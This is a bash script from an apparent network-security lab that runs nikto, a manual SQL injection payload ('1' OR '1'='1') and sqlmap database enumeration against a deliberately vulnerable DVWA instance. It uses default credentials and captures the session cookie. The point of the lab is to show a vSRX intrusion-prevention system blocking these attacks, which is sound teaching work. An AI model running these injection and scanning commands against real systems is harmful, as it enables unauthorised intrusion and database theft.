#!/bin/bash
# Scenario 5: Web Application Attacks (nikto + sqlmap)
# Run this from Kali Linux (ssh kali@<kali-eip>)
#
# Target: DVWA (Damn Vulnerable Web Application) on the web server
# Default DVWA credentials: admin / password
#
# BEFORE applying defense:
#   nikto enumerates vulnerabilities; sqlmap extracts database contents
#
# AFTER defense (IDP: "HTTP - Critical" + "SQL - Critical" attack groups):
#   SRX drops HTTP connections matching known attack signatures
#   sqlmap gets connection resets; nikto scans incomplete
#
# PREREQUISITE: IDP signatures must be installed on vSRX first!
#
# Verify on vSRX:
#   show security idp attack table
#   show security idp counters packet
#   show log security-log | match "SQL\|HTTP" | last 30

TARGET="10.0.2.100"
DVWA_URL="http://$TARGET/dvwa"

echo "========================================"
echo "Scenario 5: Web Application Attacks"
echo "Target: $TARGET (DVWA)"
echo "========================================"
echo ""

echo "[*] Step 1 — Nikto web vulnerability scan..."
echo "    This enumerates misconfigurations, old software, and known vulnerabilities."
nikto -h "http://$TARGET/" -output /tmp/nikto-results.txt
echo ""
echo "[*] Nikto results saved to /tmp/nikto-results.txt"
echo ""

echo "[*] Step 2 — Manual SQL injection test..."
echo "    Testing DVWA SQLi vulnerability at /dvwa/vulnerabilities/sqli/"
echo ""
echo "    First, get a session cookie by logging into DVWA:"
echo "      curl -s -c /tmp/dvwa-cookie.txt -X POST $DVWA_URL/login.php \\"
echo "        -d 'username=admin&password=password&Login=Login'"
echo ""
echo "    Then test SQLi:"
echo "      curl -s -b /tmp/dvwa-cookie.txt \\"
echo "        \"$DVWA_URL/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit\""
echo ""
echo "    Or use sqlmap (automated):"
echo "      # First login and get cookie:"
curl -s -c /tmp/dvwa-cookie.txt -b /tmp/dvwa-cookie.txt \
  -X POST "$DVWA_URL/login.php" \
  -d "username=admin&password=password&Login=Login" -L -o /dev/null
echo "      Cookie captured."
echo ""

echo "[*] Step 3 — sqlmap automated SQL injection..."
COOKIE=$(grep -oP 'PHPSESSID\s+\K\S+' /tmp/dvwa-cookie.txt 2>/dev/null || echo "PHPSESSID_HERE")
echo "    Using PHPSESSID: $COOKIE"
sqlmap \
  -u "$DVWA_URL/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$COOKIE; security=low" \
  --dbs \
  --batch \
  --level=2 \
  --random-agent
echo ""
echo "[+] On vSRX, run:"
echo "    show security idp attack table"
echo "    show security idp counters packet"
